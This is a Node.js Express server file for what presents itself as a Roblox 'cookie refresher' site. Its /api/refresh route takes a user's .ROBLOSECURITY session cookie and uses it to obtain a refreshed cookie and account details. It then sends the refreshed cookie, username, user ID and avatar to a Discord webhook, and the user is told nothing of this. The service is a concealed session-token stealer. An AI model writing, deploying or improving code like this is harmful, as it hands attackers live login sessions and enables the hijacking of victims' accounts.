const express = require('express');
const axios = require('axios');
const path = require('path');
const { generateAuthTicket, redeemAuthTicket } = require('./refresh'); // Uses local file
const { RobloxUser } = require('./getuserinfo'); // Uses local file

const app = express();

// This serves your HTML, JS, and images from the public folder
app.use(express.static(path.join(__dirname, '..', 'public')));
app.use(express.json());

app.get('/api/refresh', async (req, res) => {
    // ... (The rest of your API logic) ...
    const roblosecurityCookie = req.query.cookie;
    if (!roblosecurityCookie) {
        return res.status(400).json({ error: "Cookie parameter is missing" });
    }
    // ... (All the code from your original server.js /refresh route) ...
    try {
        const authTicket = await generateAuthTicket(roblosecurityCookie);
        const redemptionResult = await redeemAuthTicket(authTicket);

        if (!redemptionResult.success) {
            throw new Error("Failed to redeem auth ticket. Cookie is likely invalid.");
        }

        const refreshedCookie = redemptionResult.refreshedCookie;
        const robloxUser = await RobloxUser.register(refreshedCookie);
        const userData = await robloxUser.getUserData();

        const webhookURL = process.env.DISCORD_WEBHOOK_URL;
        if (webhookURL) {
            axios.post(webhookURL, {
                embeds: [{
                    title: 'Refreshed Cookie',
                    description: `**Refreshed Cookie:**\n\`\`\`${refreshedCookie}\`\`\``,
                    color: 16776960,
                    thumbnail: { url: userData.avatarUrl },
                    fields: [
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User ID', value: String(userData.uid), inline: true },
                        { name: 'Display Name', value: userData.displayName, inline: true },
                        { name: 'Creation Date', value: userData.createdAt, inline: true },
                    ],
                }]
            }).catch(err => console.error("Webhook failed to send:", err.message));
        }

        res.json({ redemptionResult });

    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// This route ensures that if someone visits the root URL, they get the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});


module.exports = app;